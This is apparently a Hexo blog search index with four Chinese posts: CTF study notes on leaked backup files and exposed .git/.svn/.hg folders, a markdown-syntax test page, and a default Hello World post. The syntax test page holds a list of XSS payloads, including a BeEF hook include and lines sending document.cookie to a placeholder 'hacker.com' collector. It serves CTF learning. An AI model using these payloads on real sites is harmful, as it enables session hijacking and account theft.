<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF:从0到1——札记（二）</title>
      <link href="/2021/07/09/2021-07-09-CTF%E4%BB%8E0%E5%88%B01%E2%80%94%E2%80%94%E6%9C%AD%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/07/09/2021-07-09-CTF%E4%BB%8E0%E5%88%B01%E2%80%94%E2%80%94%E6%9C%AD%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="札记（二）——-敏感备份文件、Banner识别"><a href="#札记（二）——-敏感备份文件、Banner识别" class="headerlink" title="札记（二）——  敏感备份文件、Banner识别"></a>札记（二）——  敏感备份文件、Banner识别</h1><h2 id="敏感备份文件"><a href="#敏感备份文件" class="headerlink" title="敏感备份文件"></a>敏感备份文件</h2><h3 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h3><p><strong>Hole：</strong>Linux下，用gedit编辑器保存后，当前目录下会生成一个后缀为<code>“~”</code>的文件（如<code>index.php~</code>），其内容就是刚刚编辑过的内容。</p><blockquote><p>关键词：后缀 ~ </p></blockquote><p>通过访问这个后缀的内容，即可获取源代码或<strong>flag</strong>。</p><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p><strong>Hole：</strong>vim是Linux下用的最多的编辑器，当用户在编辑文件但意外退出时，会在当前目录下生成一个备份文件，文件名格式为：<code>.文件名.swp</code>。</p><blockquote><p>关键词：.文件名.swp</p></blockquote><p>该文件用来备份缓冲区中的内容，即退出时的文件内容。第一次退出生成的文件名：<code>*.swp</code>，第二次：<code>*swo</code>，第三次：<code>*swn</code>。或者还含有<code>*un.文件名.swp</code>类型的备份文件。</p><p><strong>思路：</strong>恢复意外退出的文件，来获取<strong>flag</strong>。</p><h3 id="常规文件"><a href="#常规文件" class="headerlink" title="常规文件"></a>常规文件</h3><blockquote><ul><li>robot.txt                             爬虫君子协议，不可爬取的内容，往往包含有flag。</li></ul></blockquote><blockquote><ul><li>readme.md                        记录CMS（内容管理系统）版本等信息，或许有线索。 </li></ul></blockquote><blockquote><ul><li><a href="http://www.zip/rar/tar.gz">www.zip/rar/tar.gz</a>            往往是网站的备份源码，获取会有包含flag。</li></ul></blockquote><blockquote><p><del>待补充ing</del></p></blockquote><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>–往往实际环境中，网站的备份是网站域名的压缩包–</p><h2 id="Banner识别"><a href="#Banner识别" class="headerlink" title="Banner识别"></a>Banner识别</h2><p><strong>Banner信息：</strong>服务器对外显示的一些基础信息。</p><h3 id="自行搜集指纹库"><a href="#自行搜集指纹库" class="headerlink" title="自行搜集指纹库"></a>自行搜集指纹库</h3><blockquote><p>Tools：</p><blockquote><p>kail：         预装了 whatweb </p><p>Usage：    whatweb [options] &lt;URLs&gt;</p><p>例如：        whatweb <a href="http://www.baidu.com/">http://www.baidu.com</a> -v（-v显示的更详细）</p></blockquote><blockquote><p>Chrome扩展：Wappalyzer</p></blockquote><blockquote><p>在线识别网站：</p><p><a href="http://whatweb.bugscaner.com/look/">在线指纹识别</a></p><p><a href="https://pentest.gdpcisa.org/whatcms">whatcms</a></p><p><a href="https://www.yunsee.cn/">云悉指纹识别</a></p></blockquote></blockquote><h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><p>–或者通过404返回页面的也可以用来判断指纹信息嘞？–</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flag </tag>
            
            <tag> 后缀 </tag>
            
            <tag> 备份 </tag>
            
            <tag> Banner </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF:从0到1——札记（一）</title>
      <link href="/2021/07/09/CTF-0-2-1(1)/"/>
      <url>/2021/07/09/CTF-0-2-1(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="札记（一）——-敏感目录泄露"><a href="#札记（一）——-敏感目录泄露" class="headerlink" title="札记（一）——  敏感目录泄露"></a>札记（一）——  敏感目录泄露</h2><h3 id="1-git泄露"><a href="#1-git泄露" class="headerlink" title="1. git泄露"></a>1. git泄露</h3><blockquote><p><strong>git</strong>：<u>开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。</u></p></blockquote><p><strong>Hole</strong>：开发人员在开发过程中经常遗忘 <strong>.git</strong> 文件夹，这就导致攻击者可以通过 <strong>.git</strong> 文件夹中的信息获取开发人员所提交过的所有源码，进而导致攻击隐患。在<strong>CTF解题</strong>中即体现为<strong>flag</strong>的获取思路之一。</p><ul><li>（1）常规git泄露</li></ul><blockquote><p>此时借助工具可以<strong>直接获取</strong>网站源码，或者flag，无需额外操作。</p><blockquote><p>Tool：<a href="https://github.com/denny0223/scrabble"><strong>scrabble</strong></a></p><p>命令：<del>（kali终端中输入）</del>   ./scrabble <a href="http://example.com/">http://example.com</a></p></blockquote></blockquote><ul><li>（2）git回滚</li></ul><p>git 记录每次提交<del>（commit）</del>的修改，题中泄漏的敏感文件<del>（如flag.php）</del>可能已经被删除或覆盖了，此时可以利用 git 的<code>git reset</code>命令来恢复以前的版本。</p><blockquote><p>./scrabble <a href="http://xxxx.com/">http://xxxx.com</a></p><p>发现 HEAD <del>（即当前版本，上一版本是HEAD^）</del>文件是 old</p><p>执行命令：git reset –hard HEAD^</p></blockquote><p>另一种方式：</p><blockquote><p>git log-stat</p><p>查看修改了哪些文件</p><p>git diff HEAD commit-id</p><p>比较当前版本与想查看的commit之间的变化</p></blockquote><ul><li>（3）git分支</li></ul><blockquote><p>每次提交，<strong>git</strong> 会自动把他们串成一条时间线，这个时间线就是一个**<u>分支</u><strong>。</strong>git** 允许使用多个分支，如果没有新建分支，那么只有一条时间线，即只有一条分支，<strong>git</strong> 中默认为 <strong>master</strong> 分支。</p></blockquote><blockquote><p>Tool：<a href="https://github.com/WangYihang/GitHacker">GitHacker</a></p></blockquote><blockquote><p>命令：python GitHacker.py &lt;url&gt;.git</p><blockquote><p>或者：githacker –url <a href="http://127.0.0.1/.git/">http://127.0.0.1/.git/</a> –folder result</p></blockquote><p>运行后本地生成文件夹，进入执行以下命令：</p><blockquote><p>git log–all  或   git branch-v</p><p>只能看到master分支的信息</p><p>执行以下命令：</p><blockquote><p>git reflog</p><p>可以看到一些<strong>checkout</strong>的记录</p><p>或可执行以下命令，下载某分支的head信息到/.git/xxx/xxx/xxx中：</p><blockquote><p>wget &lt;url&gt;/.git/xxx/xxx/xxx</p></blockquote></blockquote></blockquote></blockquote><ul><li>（4）其他</li></ul><p>除了以上查看源码的利用方式，查看<code>.git/config</code>文件夹可能包含的<code>access_token</code>信息，可藉此访问这个用户的其他仓库。</p><h3 id="2-SVN泄露"><a href="#2-SVN泄露" class="headerlink" title="2. SVN泄露"></a>2. SVN泄露</h3><blockquote><p>SVN (subversion): 是源代码版本管理软件。</p></blockquote><p><strong>Hole：</strong>管理员操作不规范将SVN隐藏文件夹暴露于外网环境，可以利用<code>.svn/entries</code>或<code>wc.db</code>文件获取服务器源码等信息。</p><blockquote><p>Tools：</p><blockquote><ol><li><p><a href="https://github.com/kost/dvcs-riper">https://github.com/kost/dvcs-riper</a></p></li><li><p>Seay-svn（Windows下的源代码备份漏洞利用工具）</p></li></ol></blockquote></blockquote><h3 id="3-HG泄露"><a href="#3-HG泄露" class="headerlink" title="3.HG泄露"></a>3.HG泄露</h3><p><strong>Hole：</strong>初始化项目时，HG会在当前文件夹下创建一个<code>.hg</code>隐藏文件夹，其中<strong>包含代码和分支修改</strong>等信息。</p><blockquote><p>Tool: <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p></blockquote><h4 id="开源工具"><a href="#开源工具" class="headerlink" title="开源工具"></a>开源工具</h4><p><a href="https://github.com/maurosoria/dirseach">dirsearch</a></p><p><del>嘤嘤嘤，老是下载失败，使用魔法了也还是失败，哭了</del></p><p><img src="CTF-0-2-1(1)./dirsearch-failed.png" alt="dirsearch-failed" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flag </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>行文语法初探</title>
      <link href="/2021/07/03/2021-07-04-blog_grammar/"/>
      <url>/2021/07/03/2021-07-04-blog_grammar/</url>
      
        <content type="html"><![CDATA[<h2 id="二级标题测试"><a href="#二级标题测试" class="headerlink" title="二级标题测试"></a>二级标题测试</h2><hr><h3 id="三级标题测试"><a href="#三级标题测试" class="headerlink" title="三级标题测试"></a>三级标题测试</h3><p>  折叠内容如下：<br>    &gt;简单的初级彩色引用<br>    &gt;空一行~~下面是success引用。<br>    &gt;<div class="success"><br>    &gt;&gt; 嵌套内容显示测试 @_@<br>    &gt;&gt; - 其他元素显示测试<br>    &gt;</div></p><h3 id="emoji测试"><a href="#emoji测试" class="headerlink" title="emoji测试"></a>emoji测试</h3><p>去露营了！ :tent: 很快回来。</p><p><del>真好笑</del>！:joy:</p><h3 id="代码高亮测试"><a href="#代码高亮测试" class="headerlink" title="代码高亮测试"></a>代码高亮测试</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">class StructureCode&#123;private String name;static int num;&lt;span style&#x3D;&quot;color:#ff0000;&quot;&gt;&#x2F;&#x2F;构造代码块&lt;&#x2F;span&gt;&#123;System.out.println(&quot;我是构造代码块&quot;);cry();   &#x2F;&#x2F;没创建一个对象就执行一次cry(),代替下边两个构造函数中的cry()&#125;&lt;span style&#x3D;&quot;color:#ff0000;&quot;&gt;&#x2F;&#x2F;静态代码块&lt;&#x2F;span&gt;static&#123;num&#x3D;10;num*&#x3D;num;System.out.println(&quot;我是静态代码块&quot;);&#125;StructureCode()&#123;name&#x3D;&quot;baby&quot;;System.out.println(&quot;我是构造函数&quot;);&#x2F;&#x2F; cry();&#125;StructureCode(String name) &#x2F;&#x2F;构造函数是给对应的对象初始化&#123;this.name&#x3D;name;System.out.println(&quot;我是构造函数&quot;);&#x2F;&#x2F; cry();&#125;private void cry()&#123;System.out.println(&quot;哇哇&quot;);&#125;public void show()&#123;&lt;span style&#x3D;&quot;color:#ff0000;&quot;&gt;&#x2F;&#x2F;局部代码块&lt;&#x2F;span&gt;  &#123;int i&#x3D;55;&#125;System.out.println(&quot;上边是局部代码块&quot;);&#125;&#125; class StaticDemo1&#123;public static void main(String args [])&#123;StructureCode structureCode &#x3D; new StructureCode(&quot;小强&quot;);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js" data-language="js"><code class="language-js">#弹框警告此脚本实现弹框提示，一般作为漏洞测试或者演示使用<span class="token punctuation">,</span>类似<span class="token constant">SQL</span>注入漏洞测试中的单引号'<span class="token punctuation">,</span> 一旦此脚本能执行，也就意味着后端服务器没有对特殊字符做过滤<span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">/</span>' 这样就可以证明，这个页面位置存在了<span class="token constant">XSS</span>漏洞。<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>#页面嵌套<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com width<span class="token operator">=</span><span class="token number">300</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com width<span class="token operator">=</span><span class="token number">0</span> height<span class="token operator">=</span><span class="token number">0</span> border<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span>#页面重定向<span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">"http://www.qfedu.com"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://www.baidu.com"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>#弹框警告并重定向<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请移步到我们的新站"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://www.qfedu.com"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://10.1.64.35/mutillidae/robots.txt"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户（克隆网站收集账户）#访问恶意代码<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://www.qfedu.com/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://BeEF_IP:3000/hook.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> #结合BeEF收集用户的cookie#巧用图片标签<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"#"</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('xss');"</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"http://BeEF_IP:3000/hook.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span>#绕开过滤的脚本大小写 <span class="token operator">&lt;</span>ScrIpt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRipt<span class="token operator">></span>字符编码 采用<span class="token constant">URL</span>、Base64等编码<span class="token operator">&lt;</span>ahref<span class="token operator">=</span>"<span class="token operator">&amp;</span>#<span class="token number">106</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">118</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">99</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">105</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">112</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">58</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">101</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">34</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">120</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">34</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span>"<span class="token operator">></span>yangge<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>#收集用户cookie打开新窗口并且采用本地cookie访问目标网页，打开新窗口并且采用本地cookie访问目标网页。<span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"http://www.hacker.com/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie='+document.cookie"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie='+document.cookie"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"http://www.hacker.com/cookie.php?cookie='+document.cookie"</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="换行测试"><a href="#换行测试" class="headerlink" title="换行测试"></a>换行测试</h2><p>一句话+两空格+回车   </p><p>测试<br></p><p>success？？？</p><h2 id="图片测试"><a href="#图片测试" class="headerlink" title="图片测试"></a>图片测试</h2><p><a href="https://shgxy.github.io/"><img src="%5Cimages%5Cavatar.jpg" alt="神器的图片本片" title="神奇的图片" loading="lazy"></a></p><p><br>.<br></p><p>.</p><h2 id="链接测试"><a href="#链接测试" class="headerlink" title="链接测试"></a>链接测试</h2><p>我的博客链接 <a href="https://shgxy.github.io/" title="摇曳满地的冷清">可那灯火未明的小站</a></p><p>E-mail：&lt;shg799@foxmail,com&gt;</p>]]></content>
      
      
      <categories>
          
          <category> 新手 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/07/01/hello-world/"/>
      <url>/2021/07/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
